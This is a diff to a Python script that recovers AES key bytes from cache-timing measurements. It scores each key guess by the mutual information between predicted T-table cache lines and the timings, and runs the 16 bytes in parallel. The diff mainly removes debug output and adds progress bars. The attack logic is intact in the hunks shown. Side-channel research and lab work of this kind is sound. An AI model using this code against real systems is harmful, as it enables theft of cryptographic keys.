@@ -64,20 +64,16 @@ def score_byte(idx, pts, timings):
     print(f"[INFO] Processing byte {idx}")
     pt_byte = pts[:, idx]
     t_idx = idx % 4
-    print(f"[DEBUG] Using table index {t_idx} for byte {idx}")
     relevant_timings = timings[:, t_idx * 16:(t_idx + 1) * 16]
     mi_matrix = np.zeros((256, 16), dtype=np.float32)
-    print(f"[DEBUG] Shape of relevant timings: {relevant_timings.shape}")
 
-    for k in range(256):
+    for k in tqdm(range(256), desc=f"Byte {idx:02} Guesses", leave=False):
         predicted = np.bitwise_xor(pt_byte, k) // 16
-        print(f"[DEBUG] Processing key guess {k:02x} for byte {idx}")
         for line in range(16):
-            mask = (predicted == line).astype(int)
-            print(f"[DEBUG] Line {line}: mask sum = {mask.sum()}")
-            if mask.sum() == 0 or mask.sum() == len(mask):
+            mask = (predicted == line)
+            if not np.any(mask) or np.all(mask):
                 continue
-            mi = compute_mi(mask, relevant_timings[:, line])
+            mi = compute_mi(mask.astype(int), relevant_timings[:, line])
             mi_matrix[k, line] = mi
 
     scores = mi_matrix.max(axis=1)
@@ -85,19 +81,14 @@ def score_byte(idx, pts, timings):
     best = top5[0]
     conf = (scores[top5[0]] - scores[top5[1]]) / scores[top5[0]] if scores[top5[0]] != 0 else 0
     top_guesses = [(int(k), float(scores[k])) for k in top5]
-    print(f"[DEBUG] Byte {idx} best guess: {best:02x} with score {scores[best]:.5f}, confidence {conf:.3f}")
-    return (idx, best, scores[best], conf, mi_matrix, top_guesses)
+    return idx, best, scores[best], conf, mi_matrix, top_guesses
 
 def recover_all(pts, timings, procs):
     """Run CPA (MI-based) for all 16 AES key bytes in parallel using joblib with proper progress tracking."""
-    tasks = [delayed(score_byte)(i, pts, timings) for i in range(16)]
-    print("[DEBUG] Launching parallel jobs...")
-    results = Parallel(n_jobs=min(procs, 16), backend="loky")(tasks)
-
-    print("[DEBUG] All byte results received.")
-    results = list(tqdm(results, total=16, desc="Aggregating results"))
+    print("[INFO] Starting parallel byte processing...")
+    tasks = (delayed(score_byte)(i, pts, timings) for i in range(16))
+    results = Parallel(n_jobs=min(procs, 32), backend="loky")(tasks)
     results.sort(key=lambda x: x[0])
-
     key = bytes((r[1] & 0xF0) for r in results)
     confidences = [r[3] for r in results]
     matrices = {r[0]: r[4] for r in results}
